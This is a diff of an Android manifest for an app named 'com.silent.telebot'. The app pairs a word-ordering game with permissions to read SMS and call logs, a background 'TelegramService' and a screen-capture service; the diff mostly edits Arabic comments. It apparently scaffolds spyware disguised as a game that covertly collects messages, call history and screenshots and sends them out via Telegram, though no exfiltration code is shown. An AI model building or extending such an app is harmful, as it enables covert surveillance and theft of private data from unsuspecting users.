@@ -2,7 +2,6 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.silent.telebot">
 
-    <!-- جميع الأذونات المطلوبة -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -21,7 +20,6 @@
         android:theme="@style/Theme.AppCompat.NoActionBar"
         android:requestLegacyExternalStorage="true">
 
-        <!-- النشاط الرئيسي (يطلب الأذونات ثم يفتح اللعبة) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -33,25 +31,22 @@
             </intent-filter>
         </activity>
 
-        <!-- نشاط اللعبة -->
+        <!-- النشاط الجديد للعبة -->
         <activity
             android:name=".WordOrderActivity"
             android:exported="false"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
-        <!-- خدمة الخلفية -->
         <service
             android:name=".TelegramService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- خدمة لقطة الشاشة (إذا كنت تستخدمها) -->
         <service
             android:name=".ScreenCaptureService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
-        <!-- FileProvider للكاميرا (إذا احتجت) -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
@@ -63,4 +58,4 @@
         </provider>
 
     </application>
-</manifest>
+</manifest> 
